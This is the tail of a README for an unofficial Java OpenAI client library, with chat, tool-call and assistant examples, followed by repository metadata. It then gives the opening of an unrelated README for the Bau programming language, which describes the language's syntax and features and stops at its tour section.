  //Here, the imageMessage is intended for image recognition
  final ChatMessage imageMessage = UserMessage.buildImageMessage(""What's in this image?"",
          ""https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Gfp-wisconsin-madison-the-nature-boardwalk.jpg/2560px-Gfp-wisconsin-madison-the-nature-boardwalk.jpg"");
  messages.add(systemMessage);
  messages.add(imageMessage);

  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4-turbo"")
          .messages(messages)
          .n(1)
          .maxTokens(200)
          .build();
  ChatCompletionChoice choice = service.createChatCompletion(chatCompletionRequest).getChoices().get(0);
  System.out.println(choice.getMessage().getContent());
}
```

</details>

<details>
<summary>Customizing OpenAiService</summary>
OpenAiService is versatile in its setup options, as demonstrated in the `example.ServiceCreateExample` within the example package.

```java
//0 Using the default configuration, read the environment variables OPENAI-API_KEY, OPENAI-API_BASE-URL as the default API_KEY and BASE-URL,
//encourage the use of environment variables to load the OpenAI API key
OpenAiService openAiService0 = new OpenAiService();
//1.Use the default base URL and configure service by default. Here, the base URL (key: OPENAI API BASE URL) will be obtained from the environment variable by default. If not, the default URL will be used“ https://api.openai.com/v 1/"";
OpenAiService openAiService = new OpenAiService(API_KEY);
//2. Use custom base Url with default configuration of service
OpenAiService openAiService1 = new OpenAiService(API_KEY, BASE_URL);
//3.Custom expiration time
OpenAiService openAiService2 = new OpenAiService(API_KEY, Duration.ofSeconds(10));
//4. More flexible customization
//4.1. customize okHttpClient
OkHttpClient client = new OkHttpClient.Builder()
        //connection pool
        .connectionPool(new ConnectionPool(Runtime.getRuntime().availableProcessors() * 2, 30, TimeUnit.SECONDS))
        //Customized interceptors, such as retry interceptors, log interceptors, load balancing interceptors, etc
        // .addInterceptor(new RetryInterceptor())
        // .addInterceptor(new LogInterceptor())
        // .addInterceptor(new LoadBalanceInterceptor())
        // .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""proxyHost"", 8080)))
        .connectTimeout(2, TimeUnit.SECONDS)
        .writeTimeout(3, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))
        .build();
//4.2 Customizing Retorfit Configuration
Retrofit retrofit = OpenAiService.defaultRetrofit(client, OpenAiService.defaultObjectMapper(), BASE_URL);
OpenAiApi openAiApi = retrofit.create(OpenAiApi.class);
OpenAiService openAiService3 = new OpenAiService(openAiApi);
```

</details>

<details>
<summary>stream chat</summary>

```java
    static void streamChat() {
  //api-key get from environment variable OPENAI_API_KEY
  OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
  List<ChatMessage> messages = new ArrayList<>();
  ChatMessage systemMessage = new SystemMessage(""You are a cute cat and will speak as such."");
  messages.add(systemMessage);
  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4o-mini"")
          .messages(messages)
          .n(1)
          .maxTokens(50)
          .build();
  service.streamChatCompletion(chatCompletionRequest).blockingForEach(System.out::println);
}
```

</details>

<details>
<summary>Tools</summary>
This library supports both the outdated method of function calls and the current tool-based approach.

First, we define a function object. The definition of a function object is flexible; you can use POJO to define it (
automatically serialized by JSON schema) or use methods like `map` and `FunctionDefinition` to define it. You can refer
to the code in the example package. Here, we define a weather query function object:

```java
public class Weather {
    @JsonPropertyDescription(""City and state, for example: León, Guanajuato"")
    public String location;
    @JsonPropertyDescription(""The temperature unit, can be 'celsius' or 'fahrenheit'"")
    @JsonProperty(required = true)
    public WeatherUnit unit;
}
public enum WeatherUnit {
    CELSIUS, FAHRENHEIT;
}
public static class WeatherResponse {
    public String location;
    public WeatherUnit unit;
    public int temperature;
    public String description;
    
    // constructor
}
```

Next, we declare the function and associate it with an executor, here simulating an API response:

```java
//First, a function to fetch the weather
public static FunctionDefinition weatherFunction() {
    return FunctionDefinition.<Weather>builder()
            .name(""get_weather"")
            .description(""Get the current weather in a given location"")
            .parametersDefinitionByClass(Weather.class)
            //The executor here is a lambda expression that accepts a Weather object and returns a Weather Response object
            .executor(w -> new WeatherResponse(w.location, w.unit, 25, ""sunny""))
            .build();
}
```

Then, the service is used for a chatCompletion request, incorporating the tool:

```java
static void toolChat() {
    OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
    final ChatTool tool = new ChatTool(ToolUtil.weatherFunction());
    final List<ChatMessage> messages = new ArrayList<>();
    final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
    final ChatMessage userMessage = new UserMessage(""What is the weather in BeiJin?"");
    messages.add(systemMessage);
    messages.add(userMessage);

    ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            //Tools is a list; multiple tools can be included
            .tools(Collections.singletonList(tool))
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .build();
    //Request is sent
    ChatCompletionChoice choice = service.createChatCompletion(chatCompletionRequest).getChoices().get(0);
    AssistantMessage toolCallMsg = choice.getMessage();
    ChatToolCall toolCall = toolCallMsg.getToolCalls().get(0);
    System.out.println(toolCall.getFunction());

    messages.add(toolCallMsg);
    messages.add(new ToolMessage(""the weather is fine today."", toolCall.getId()));

    //submit tool call
    ChatCompletionRequest toolCallRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .n(1)
            .maxTokens(100)
            .build();
    ChatCompletionChoice toolCallChoice = service.createChatCompletion(toolCallRequest).getChoices().get(0);
    System.out.println(toolCallChoice.getMessage().getContent());
}
```

</details>  

<details>
<summary>stream chat with tool call (support Concurrent tool call)</summary>

```java
void streamChatMultipleToolCalls() {
    final List<FunctionDefinition> functions = Arrays.asList(
            //1. weather query
            FunctionDefinition.<ToolUtil.Weather>builder()
                    .name(""get_weather"")
                    .description(""Get the current weather in a given location"")
                    .parametersDefinitionByClass(ToolUtil.Weather.class)
                    .executor( w -> {
                        switch (w.location) {
                            case ""tokyo"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 10, ""cloudy"");
                            case ""san francisco"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 72, ""sunny"");
                            case ""paris"":
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 22, ""sunny"");
                            default:
                                return new ToolUtil.WeatherResponse(w.location, w.unit, 0, ""unknown"");
                        }
                    }).build(),
            //2. city query
            FunctionDefinition.<ToolUtil.City>builder().name(""getCities"").description(""Get a list of cities by time"").parametersDefinitionByClass(ToolUtil.City.class).executor(v -> Arrays.asList(""tokyo"", ""paris"")).build()
    );
    final FunctionExecutorManager toolExecutor = new FunctionExecutorManager(functions);

    List<ChatTool> tools = new ArrayList<>();
    tools.add(new ChatTool(functions.get(0)));
    tools.add(new ChatTool(functions.get(1)));

    final List<ChatMessage> messages = new ArrayList<>();
    final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
    final ChatMessage userMessage = new UserMessage(""What is the weather like in cities with weather on 2022-12-01 ?"");
    messages.add(systemMessage);
    messages.add(userMessage);

    ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(200)
            .build();

    AssistantMessage accumulatedMessage = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest))
            .blockingLast()
            .getAccumulatedMessage();

    List<ChatToolCall> toolCalls = accumulatedMessage.getToolCalls();

    ChatToolCall toolCall = toolCalls.get(0);
    ChatFunctionCall function = toolCall.getFunction();
    JsonNode jsonNode = toolExecutor.executeAndConvertToJson(function.getName(), function.getArguments());
    ToolMessage toolMessage = toolExecutor.executeAndConvertToChatMessage(function.getName(),function.getArguments(), toolCall.getId());
    messages.add(accumulatedMessage);
    messages.add(toolMessage);
    ChatCompletionRequest chatCompletionRequest2 = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .logitBias(new HashMap<>())
            .build();

    // ChatCompletionChoice choice2 = service.createChatCompletion(chatCompletionRequest2).getChoices().get(0);
    AssistantMessage accumulatedMessage2 = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest2))
            .blockingLast()
            .getAccumulatedMessage();
    messages.add(accumulatedMessage2);
    for (ChatToolCall weatherToolCall : accumulatedMessage2.getToolCalls()) {
        ChatFunctionCall call2 = weatherToolCall.getFunction();
        Object itemResult = toolExecutor.execute(call2.getName(), call2.getArguments());
        messages.add(toolExecutor.executeAndConvertToChatMessage(call2.getName(),call2.getArguments(), weatherToolCall.getId()));
    }

    ChatCompletionRequest chatCompletionRequest3 = ChatCompletionRequest
            .builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .tools(tools)
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .logitBias(new HashMap<>())
            .build();

    AssistantMessage accumulatedMessage3 = service.mapStreamToAccumulator(service.streamChatCompletion(chatCompletionRequest3))
            .blockingLast()
            .getAccumulatedMessage();
}

```

</details>
<details>
<summary>Token usage calculate</summary>

```java
public static void main(String... args) {
  List<ChatMessage> messages = new ArrayList<>();
  messages.add(new SystemMessage(""Hello OpenAI 1.""));
  messages.add(new SystemMessage(""Hello OpenAI 2.   ""));
  messages.add(new UserMessage(Arrays.asList(new ImageContent(""text"", """", new ImageUrl(""dddd"")))));
  int tokens_1 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_3_5_TURBO.getName(), messages);
  int tokens_2 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_3_5_TURBO.getName(), ""Hello OpenAI 1."");
  int tokens_3 = TikTokensUtil.tokens(TikTokensUtil.ModelEnum.GPT_4_TURBO.getName(), messages);
}
```

</details>

<details>
<summary>Assistant Tool Call</summary>

```java
static void assistantToolCall() {
    OpenAiService service = new OpenAiService();
    FunctionExecutorManager executor = new FunctionExecutorManager(Collections.singletonList(ToolUtil.weatherFunction()));
    AssistantRequest assistantRequest = AssistantRequest.builder()
            .model(""gpt-4o-mini"").name(""weather assistant"")
            .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
            .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
            .temperature(0D)
            .build();
    Assistant assistant = service.createAssistant(assistantRequest);
    String assistantId = assistant.getId();
    ThreadRequest threadRequest = ThreadRequest.builder().build();
    Thread thread = service.createThread(threadRequest);
    String threadId = thread.getId();

    MessageRequest messageRequest = MessageRequest.builder()
            .content(""What's the weather of Xiamen?"")
            .build();
    //add message to thread
    service.createMessage(threadId, messageRequest);
    RunCreateRequest runCreateRequest = RunCreateRequest.builder().assistantId(assistantId).build();

    Run run = service.createRun(threadId, runCreateRequest);

    Run retrievedRun = service.retrieveRun(threadId, run.getId());
    while (!(retrievedRun.getStatus().equals(""completed""))
            && !(retrievedRun.getStatus().equals(""failed""))
            && !(retrievedRun.getStatus().equals(""expired""))
            && !(retrievedRun.getStatus().equals(""incomplete""))
            && !(retrievedRun.getStatus().equals(""requires_action""))) {
        retrievedRun = service.retrieveRun(threadId, run.getId());
    }
    System.out.println(retrievedRun);

    RequiredAction requiredAction = retrievedRun.getRequiredAction();
    List<ToolCall> toolCalls = requiredAction.getSubmitToolOutputs().getToolCalls();
    ToolCall toolCall = toolCalls.get(0);
    ToolCallFunction function = toolCall.getFunction();
    String toolCallId = toolCall.getId();

    SubmitToolOutputsRequest submitToolOutputsRequest = SubmitToolOutputsRequest.ofSingletonToolOutput(toolCallId, executor.executeAndConvertToJson(function.getName(),function.getArguments()).toPrettyString());
    retrievedRun = service.submitToolOutputs(threadId, retrievedRun.getId(), submitToolOutputsRequest);

    while (!(retrievedRun.getStatus().equals(""completed""))
            && !(retrievedRun.getStatus().equals(""failed""))
            && !(retrievedRun.getStatus().equals(""expired""))
            && !(retrievedRun.getStatus().equals(""incomplete""))
            && !(retrievedRun.getStatus().equals(""requires_action""))) {
        retrievedRun = service.retrieveRun(threadId, run.getId());
    }

    System.out.println(retrievedRun);

    OpenAiResponse<Message> response = service.listMessages(threadId, MessageListSearchParameters.builder()
            .runId(retrievedRun.getId()).build());
    List<Message> messages = response.getData();
    messages.forEach(message -> {
        System.out.println(message.getContent());
    });

}
```

</details>

<details>
<summary>Assistant Stream </summary>

```java
static void assistantStream() throws JsonProcessingException {
  OpenAiService service = new OpenAiService();
  String assistantId;
  String threadId;

  AssistantRequest assistantRequest = AssistantRequest.builder()
          .model(""gpt-4o-mini"").name(""weather assistant"")
          .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
          .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
          .temperature(0D)
          .build();
  Assistant assistant = service.createAssistant(assistantRequest);
  assistantId = assistant.getId();

    //general response
  Flowable<AssistantSSE> threadAndRunStream = service.createThreadAndRunStream(
          CreateThreadAndRunRequest.builder()
                  .assistantId(assistantId)
                  //no tools are used here
                  .toolChoice(ToolChoice.NONE)
                  .thread(ThreadRequest.builder()
                          .messages(Collections.singletonList(
                                  MessageRequest.builder()
                                          .content(""hello what can you help me with?"")
                                          .build()
                          ))
                          .build())
                  .build()
  );

  ObjectMapper objectMapper = new ObjectMapper();
  TestSubscriber<AssistantSSE> subscriber1 = new TestSubscriber<>();
  threadAndRunStream
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber1);

  Optional<AssistantSSE> runStepCompletion = subscriber1.values().stream().filter(item -> item.getEvent().equals(StreamEvent.THREAD_RUN_STEP_COMPLETED)).findFirst();
  RunStep runStep = objectMapper.readValue(runStepCompletion.get().getData(), RunStep.class);
  System.out.println(runStep.getStepDetails());

    // Function call stream
  threadId = runStep.getThreadId();
  service.createMessage(threadId, MessageRequest.builder().content(""Please help me check the weather in Beijing"").build());
  Flowable<AssistantSSE> getWeatherFlowable = service.createRunStream(threadId, RunCreateRequest.builder()
          //Force the use of the get weather function here
          .assistantId(assistantId)
          .toolChoice(new ToolChoice(new Function(""get_weather"")))
          .build()
  );

  TestSubscriber<AssistantSSE> subscriber2 = new TestSubscriber<>();
  getWeatherFlowable
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber2);

  AssistantSSE requireActionSse = subscriber2.values().get(subscriber2.values().size() - 2);
  Run requireActionRun = objectMapper.readValue(requireActionSse.getData(), Run.class);
  RequiredAction requiredAction = requireActionRun.getRequiredAction();
  List<ToolCall> toolCalls = requiredAction.getSubmitToolOutputs().getToolCalls();
  ToolCall toolCall = toolCalls.get(0);
  String callId = toolCall.getId();

  System.out.println(toolCall.getFunction());
    // Submit function call results
    Flowable<AssistantSSE> toolCallResponseFlowable = service.submitToolOutputsStream(threadId, requireActionRun.getId(), SubmitToolOutputsRequest.ofSingletonToolOutput(callId, ""The weather in Beijing is sunny""));
  TestSubscriber<AssistantSSE> subscriber3 = new TestSubscriber<>();
  toolCallResponseFlowable
          .doOnNext(System.out::println)
          .blockingSubscribe(subscriber3);

  Optional<AssistantSSE> msgSse = subscriber3.values().stream().filter(item -> StreamEvent.THREAD_MESSAGE_COMPLETED.equals(item.getEvent())).findFirst();
  Message message = objectMapper.readValue(msgSse.get().getData(), Message.class);
  String responseContent = message.getContent().get(0).getText().getValue();
  System.out.println(responseContent);
}
```

</details>


<details>
<summary>Assistant Stream Manager</summary>

By using the `AssistantEventHandler` class and the `AssistantStreamManager` class, it is easier to manage the streaming
calls of Assistant `AssistantEventHandler` contains all Assistant stream event callback hooks, and you can implement
different events as needed:

```java
    /**
     * You can implement various event callbacks for Assistant Event Handlers according to your own needs, making it convenient for you to handle various events related to Assistant
     */
    private static class LogHandler implements AssistantEventHandler {
        @Override
        public void onEvent(AssistantSSE sse) {
            //every event will call this method
        }

        @Override
        public void onRunCreated(Run run) {
            System.out.println(""start run: "" + run.getId());
        }

        @Override
        public void onEnd() {
            System.out.println(""stream end"");
        }

        @Override
        public void onMessageDelta(MessageDelta messageDelta) {
            System.out.println(messageDelta.getDelta().getContent().get(0).getText());
        }

        @Override
        public void onMessageCompleted(Message message) {
            System.out.println(""message completed"");
        }

        @Override
        public void onMessageInComplete(Message message) {
            System.out.println(""message in complete"");
        }

        @Override
        public void onError(Throwable error) {
            System.out.println(""error:"" + error.getMessage());
        }
    }
```

`AssistantStreamManager` arranges and manages various events in the stream, supporting synchronous/asynchronous
retrieval of content from the stream,
which can be obtained through the manager. Below is a usage example, for more examples, please refer
to `AssistantStreamManagerTest.java`.

```java
    static void streamTest() {
    OpenAiService service = new OpenAiService();
    //1. create assistant
    AssistantRequest assistantRequest = AssistantRequest.builder()
            .model(""gpt-4o-mini"").name(""weather assistant"")
            .instructions(""You are a weather assistant responsible for calling the weather API to return weather information based on the location entered by the user"")
            .tools(Collections.singletonList(new FunctionTool(ToolUtil.weatherFunction())))
            .temperature(0D)
            .build();
    Assistant assistant = service.createAssistant(assistantRequest);
    String assistantId = assistant.getId();

    System.out.println(""assistantId:"" + assistantId);
    ThreadRequest threadRequest = ThreadRequest.builder()
            .build();
    Thread thread = service.createThread(threadRequest);
    String threadId = thread.getId();
    System.out.println(""threadId:"" + threadId);
    MessageRequest messageRequest = MessageRequest.builder()
            .content(""What can you help me with?"")
            .build();
    service.createMessage(threadId, messageRequest);
    RunCreateRequest runCreateRequest = RunCreateRequest.builder()
            .assistantId(assistantId)
            .toolChoice(ToolChoice.AUTO)
            .build();

    //blocking
    // AssistantStreamManager blockedManagere = AssistantStreamManager.syncStart(service.createRunStream(threadId, runCreateRequest), new LogHandler());
    //async
    AssistantStreamManager streamManager = AssistantStreamManager.start(service.createRunStream(threadId, runCreateRequest), new LogHandler());


    //Other operations can be performed here...
    boolean completed = streamManager.isCompleted();


    // you can shut down the streamManager if you want to stop the stream
    streamManager.shutDown();

    //waiting for completion
    streamManager.waitForCompletion();
    // all of flowable events
    List<AssistantSSE> eventMsgsHolder = streamManager.getEventMsgsHolder();

    Optional<Run> currentRun = streamManager.getCurrentRun();
    // get the accumulated message
    streamManager.getAccumulatedMsg().ifPresent(msg -> {
        System.out.println(""accumulatedMsg:"" + msg);
    });
    service.deleteAssistant(assistantId);
    service.deleteThread(threadId);
}
```

</details>

- [Assistant iamge chat](./service/src/test/java/com/theokanning/openai/service/assistants/AssistantImageTest.java#L65-L90)

# FAQs

<details style=""border: 1px solid #aaa; border-radius: 4px; padding: 0.5em;"">
<summary style=""font-weight: bold; color: #333;"">Is it possible to customize the OpenAI URL or use a proxy URL?</summary>
<p style=""padding: 0.5em; margin: 0; color: #555;"">Yes, you can specify a URL when constructing OpenAiService, which will serve as the base URL.But we recommend using the
environment variable OPENAI_API_BASE_URL and OPENAI_API_KEY to load the OpenAI API key.</p>
</details>

<details style=""border: 1px solid #aaa; border-radius: 4px; padding: 0.5em;"">
<summary style=""font-weight: bold; color: #333;"">Why am I experiencing connection timeouts?</summary>
<p style=""padding: 0.5em; margin: 0; color: #555;"">Ensure your network is stable and your OpenAI server is accessible. If you face network instability, consider increasing the timeout duration.</p>
</details>

# Contributing to OpenAi4J

We welcome contributions from the community and are always looking for ways to make our project better. If you're
interested in helping improve OpenAi4J, here are some ways you can contribute:

## Reporting Issues

Please use the GitHub Issues page to report issues. Be as specific as possible about how to reproduce the problem you
are having, and include details like your operating system, Java version, and any relevant stack traces.

## Submitting Pull Requests

1. Fork the repository and create your branch from `main`.
2. If you've added code that should be tested, add tests.
3. Ensure your code lints and adheres to the existing style guidelines.
4. Write a clear log message for your commits. One-line messages are fine for small changes, but bigger changes should
   have detailed descriptions.
5. Complete the pull request form, linking to any issues your PR addresses.

## Support Us

We hope you find this library useful! If you do, consider giving it a star on library❤️❤️❤️. Your support helps us keep
the project alive and continuously improve it. Stay tuned for updates and feel free to contribute to the project or
suggest new features.
Thank you for supporting OpenAi4J!

# Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/Lambdua/openai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=Lambdua/openai4j"" />
</a>

# License
Released under the MIT License


",22,3,1,mit,21.0,"['unofficial', 'java', 'library', 'tailored', 'facilitate', 'interaction', 'openai', 'gpt', 'model', 'including', 'newest', 'addition', 'vision', 'originally', 'forked', 'library', 'continues', 'development', 'incorporate', 'latest', 'api', 'feature', 'original', 'project', 'maintenance', 'discontinued', 'feature', 'full', 'support', 'openai', 'api', 'model', 'including', 'completion', 'chat', 'edits', 'embeddings', 'audio', 'file', 'image', 'moderation', 'batch', 'client', 'setup', 'retrofit', 'immediate', 'api', 'interaction', 'extensive', 'example', 'documentation', 'help', 'start', 'quickly', 'customizable', 'setup', 'environment', 'variable', 'integration', 'api', 'key', 'base', 'url', 'support', 'synchronous', 'asynchronous', 'api', 'call', 'library', 'aim', 'provide', 'java', 'developer', 'robust', 'tool', 'integrate', 'openai', 'powerful', 'capability', 'application', 'effortlessly', 'quick', 'start', 'import', 'gradle', 'maven', 'chat', 'openai', 'model', 'using', 'pojo', 'wish', 'develop', 'client', 'simply', 'import', 'pojos', 'api', 'module', 'ensure', 'client', 'adopts', 'snake', 'case', 'naming', 'compatibility', 'openai', 'api', 'utilize', 'pojos', 'import', 'api', 'module', 'example', 'sample', 'code', 'package', 'includes', 'functional', 'usage', 'refer', 'code', 'example', 'package', 'commonly', 'used', 'feature', 'usage', 'example', 'first', 'define', 'function', 'object', 'definition', 'function', 'object', 'flexible', 'use', 'pojo', 'define', 'automatically', 'serialized', 'json', 'schema', 'use', 'method', 'like', 'define', 'refer', 'code', 'example', 'package', 'define', 'weather', 'query', 'function', 'object', 'next', 'declare', 'function', 'associate', 'executor', 'simulating', 'api', 'response', 'service', 'used', 'chatcompletion', 'request', 'incorporating', 'tool', 'using', 'class', 'class', 'easier', 'manage', 'streaming', 'call', 'assistant', 'contains', 'assistant', 'stream', 'event', 'callback', 'hook', 'implement', 'different', 'event', 'needed', 'arranges', 'manages', 'various', 'event', 'stream', 'supporting', 'retrieval', 'content', 'stream', 'obtained', 'manager', 'usage', 'example', 'example', 'please', 'refer', 'assistant', 'iamge', 'chat', 'faq', 'contributing', 'welcome', 'contribution', 'community', 'always', 'looking', 'way', 'make', 'project', 'better', 'interested', 'helping', 'improve', 'way', 'contribute', 'reporting', 'issue', 'please', 'use', 'github', 'issue', 'page', 'report', 'issue', 'specific', 'possible', 'reproduce', 'problem', 'include', 'detail', 'like', 'operating', 'system', 'java', 'version', 'relevant', 'stack', 'trace', 'submitting', 'pull', 'requests', 'fork', 'repository', 'create', 'branch', 'added', 'code', 'tested', 'add', 'test', 'ensure', 'code', 'lint', 'adheres', 'existing', 'style', 'guideline', 'write', 'clear', 'log', 'message', 'commits', 'message', 'fine', 'small', 'change', 'bigger', 'change', 'detailed', 'description', 'complete', 'pull', 'request', 'form', 'linking', 'issue', 'pr', 'address', 'support', 'u', 'hope', 'find', 'library', 'useful', 'consider', 'giving', 'star', 'support', 'help', 'u', 'keep', 'project', 'alive', 'continuously', 'improve', 'stay', 'tuned', 'update', 'feel', 'free', 'contribute', 'project', 'suggest', 'new', 'feature', 'thank', 'supporting', 'contributor', 'license', 'released', 'mit', 'license']","['api', 'example', 'openai', 'code', 'library']",12,1,0,"['feature', 'quick', 'start', 'import', 'gradle', 'maven', 'chat', 'openai', 'model', 'just', 'use', 'pojo', 'example', 'faq', 'contribute', 'report', 'issue', 'submit', 'pull', 'request', 'support', 'u', 'contributor', 'license']",16,"['feature', 'quick', 'start', 'import', 'gradle']",15,111.0,5.0,"[org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,1.0,29180,40.41095890410959,6.978305084745763,['Maven Central -> https://img.shields.io/maven-central/v/io.github.lambdua/service?color=blue'],1
thomasmueller/bau-lang,main,"# Bau

Bau is a simple, concise, safe, powerful and fast programming language. Features:

* Easy to learn. Concise syntax.
* Memory-safe. Statically typed.
* Fast compilation and execution (transpiles to C).

<a href=""https://thomasmueller.github.io/bau-lang/"">Try it out in the browser.</a>

It addresses other languages' issues:

* Memory safety (C, C++)
* Hard to use and master (C++, Rust)
* Vendor lock-in (Java, Swift, C#)
* GC pauses (Python, Java, C#,...)
* Verbose syntax (C, Go, Java,...)
* Slow execution (Python)
* Null pointer errors (Java, C,...)
* Array bound checks (Java, Rust,...)

## Example

    fun fact(x int) int
        if x <= 1
            return 1
        return x * fact(x - 1)

    for i:= range(0 20)
        println(fact(i))

## Keywords

Control flow
* `if` `elif` `else` `for` `while`
* `break` `continue` `return`
* `throw` `catch` `switch` `case`

Assignment, comparison, operations
* `:` constant, `:=`  variable
* `=` `+=` `-=` `*=` `/=` etc. update
* `=` `<` `>` `<=` `>=` `<>`
* `and` `or` `not` `+` `-` `*` `/` `%`
* `&` `|` `^` `~` `<<` `>>` bitwise

Data types and miscellaneous
* `int` `i32` `i16` `i8`, `float` `f32`
* `#` comment, `##` block comment
* `fun` `type` `enum` `const` `macro`
* `import` `module` `null`
* `()` `[]` `.` `..` `,` `'` `` ` `` `?`

### Constants, Variables

Identifiers contain letters, digits, and `_`.
`:` defines a constant.
`:=` defines a variable. `=` `+=` `-=` `*=`
`/=` `&=` `|=` `^=` `<<=` `>>=` updates it:

    PI : 3.14159
    x := 10
    x = x + 1
    x += 1      # shortcut

A variable without value requires a type:

    x int

### Built-In Types

The built-in types are `int` `i32` `i16` `i8` (signed integer),
and `float` `f32` (floating point).
`int` can be restricted to a range using `0..`.
Defaults are `int` and `float`; both are 64 bit.
Conversion functions change the type, and may truncate.

    c := i8(10)
    
### Conditions

`if` starts a condition.
Spaces group statements into blocks.
`elif` (else if) and `else` are optional.

    if a = 0
        println('zero')
    elif a = 1
        println('one')
    else
        println('many')

### Loops

There are `for` and `while` loops.
`,` is optional if the arguments are simple:

    # loop from 0 to 9
    for i := range(0 10)
        println(i)

`for` is internally converted to `while`:

    i := 0
    while i < 10
        println(i)
        i += 1

`break` exits a loop. It may have a condition:

    # prints 1 to 4
    for i := range(1 10)
        break i = 5
        println(i)

### Comments

`#` starts a line comments; 
two or more start and end a block comment.

    # Line comment
    
    ##
    Block comment
    ##

Comments before types and functions are
converted to documentation.

### Literals

Numbers start with a digit. `_` is ignored.
`.` is floating point, `0x` hexadecimal. 

Strings starting with `'` 
may contain `\n` newline, `\t` tab, `\'` single quote, 
`\\` backslash, `\x00` byte. UTF-8 is used.

Raw strings don't have escapes 
and start and end with one or more `` ` ``.
Multi-line ones begin on the next line 
and may be indented.

    a : 1_000_000
    b : 3.1415
    c : 0xcafe
    d : 'String literal'
    e : `Raw string`
    f : ``
        Two-line
        raw string with `
        ``

### Operators

`=` `<` `>` `<=` `>=` `<>` compare two values and return `1` or `0`.
`not` inverses a comparison. `and` `or` combines comparisons;
the right side is only evaluated when needed.
Integer `+` `-` `*` wrap around on over- / underflow.
`/` `%`: integer division by 0 returns max, min, or 0.
`&` `|` `^` `~` `<<` `>>` are bitwise and, or, xor, not, 
shift right, and logical shift right: the leftmost bits become `0`.

### Functions

`fun` starts a function. It may `return` a value.
`..` means variable number of arguments.
Functions can share a name if the number of arguments is different.
They can be declared first and implemented later.
`const` functions are executed at compile time
if the arguments are constants.
`macro` function calls are replaced at compile time
with the implementation.
Types can be passed as parameters or implicitly
(internally, this functions are templates).

    fun square(x int) int
        return x * x

    fun sum(x int..) const int
        sum := 0
        for i := until(x.len)
            sum += x[i]
        return sum

    fun if(cond int, true T, false T) macro T
        if cond
            return true
        else
            return false
    
    println('sum: ' sum(1 2 3))
    for i := until(5)
        println(square(i))
        println(if(i % 2, 'odd', 'even'))

### Types

Types can have fields and functions:

    type Square
        length int
    fun Square area() int
        return length * length
    s : new(Square)
      
If a type has a `close` function, then it is called
before the memory is freed.
`int` and other lowercase types are copied when assigned;
uppercase types are referenced.
Functions on built-in types are allowed:

    fun int square() int
        return this * this
    println(12.square())

Types can have parameters:

    type List(T)
        array T[]
        size int
    fun newList(T type) List(T)
        ...
    list := newList(Circle)

### Null

`?` means it may be `null`. 
An explicit check is required before using the value.
There are no null pointer errors at runtime.

    fun get(key int) Circle?
        # may return null

    v : get(key) 
    if v
        print(v.area())

Value types (eg. `int`) can't be `null`.

### Arrays Access

To create and access arrays, use:

    data : new(i8[], 3)
    data[0] = 10

Bounds are checked where needed.
Access without runtime checks require that the compiler verifies correctness.
Index variables with range restrictions allow this.
For performance-critical code, use `[` `]!` to ensure
no runtime checks are done.
The conditional `break` guarantees that `i` is within the bounds.

    if data.len
        i := 0..data.len
        while 1
            data[i]! = i
            next : i + 1
            break next >= data.len
            i = next

### Exceptions

`throw` throws an exception. `catch` is needed,
or the method needs `throws`.
Custom exception types are allowed.

    import org.bau.Exception
        exception

    fun square(x int) int throws exception
        if x > 3_000_000_000
            throw exception('Too big')
        return x * x
    
    x := square(3_000_000_001)
    println(x)
    catch e
        println(e.message)

### Modules and Import

`import` allows using types and functions from a module.
The last part of the module name is the identifier.
The module identifier can be omitted
if the type, function, or constant is listed after `import`.
The full module name can be used as well.

    import org.bau.Utils
        random
    import org.bau.Math
    println(random())
    println(Utils.getNanoTime())
    println(Math.PI)
    println(org.bau.Math.PI)

`module` defines a module. 
The name needs to match the file path, here `org/bau/Math.bau`:

    module org.bau.Math
    PI : 3.14159265358979323846

### Tour

#### Hello World
